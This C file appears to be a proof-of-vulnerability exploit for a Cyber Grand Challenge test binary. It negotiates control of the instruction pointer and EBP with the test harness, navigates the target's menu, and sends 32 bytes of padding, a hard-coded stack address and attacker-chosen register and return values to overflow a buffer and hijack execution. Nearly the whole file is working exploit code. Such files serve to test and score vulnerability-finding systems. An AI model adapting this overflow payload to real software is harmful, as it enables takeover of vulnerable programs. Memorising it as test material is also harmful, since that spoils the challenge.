#include <libcgc.h>


int senddata(int fd, void *outdata, const size_t size) {
    size_t tx_bytes = 0;
    size_t count = 0;

    if ( outdata == NULL) {
        return -1;
    } 

    while (count < size) {
        if ( transmit(fd, outdata + count, 1, &tx_bytes) != 0 ) {
            _terminate(0);
        }

        if (tx_bytes <= 0) {
            _terminate(0);
        }

        count += tx_bytes;
    }

    return 0;
}

int recvdata(int fd, void *indata, const size_t size ) {
    size_t rx_bytes = 0;
    size_t total = 0;

    if (indata == NULL ) {
        return -1;
    } 

    while (rx_bytes < size) {
        if ( receive(fd, indata + total, size-total, &rx_bytes) != 0 ) {
            _terminate(0);
        }

        total += rx_bytes;
    }

    return 0;
}

int ru( int fd, char delim, const size_t size )
{
	int i = 0;
	char c;

	for ( i = 0; i < size; i++){
		recvdata( fd, &c, 1);

		if ( c == delim) {
			return i;
		}
	}

	return 0;
}

int main(void)
{
	/// Type 1 POV Is control of PC and a reg
	int pov_type = 1;

	// I do not have full control because I cannot send a newline
	int ip_mask = 0x7f7f7f7f;
	int regmask = 0x7f7f7f7f;

	/// I can control EBP
	int regnum = 5;
	unsigned int ipvalue = 0;
	unsigned int regvalue = 0;

	unsigned char out[512];
	int value;


	if (senddata(3, &pov_type, sizeof(pov_type)) != 0) {
		_terminate(-1);
	}

	if (senddata(3, &ip_mask, sizeof(ip_mask)) != 0) {
		_terminate(-1);
	}

	if (senddata(3, &regmask, sizeof(regmask)) != 0) {
		_terminate(-1);
	}

	if (senddata(3, &regnum, sizeof(regnum)) != 0) {
		_terminate(-1);
	}

	if (recvdata(3, &ipvalue, sizeof(ipvalue)) != 0) {
		_terminate(-1);
	}

	if (recvdata(3, &regvalue, sizeof(regnum)) != 0) {
		_terminate(-1);
	}

	/// Read the menu
	ru( 0, ':', 50);
	ru( 0, ' ', 1);

	senddata(1, "1\n", 2);

	ru( 0, ':', 20);
	ru( 0, ' ', 2);

	senddata(1, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 32);
	/// Yes, a hard coded stack address but I overwrite the destination pointer and
	///		and need somewhere to go
	senddata(1, "\xc4\xaa\xaa\xba", 4);
	senddata(1, "junk", 4);
	senddata(1, &regvalue, sizeof(value));
	senddata(1, &ipvalue, sizeof(value));

	return 0;
}

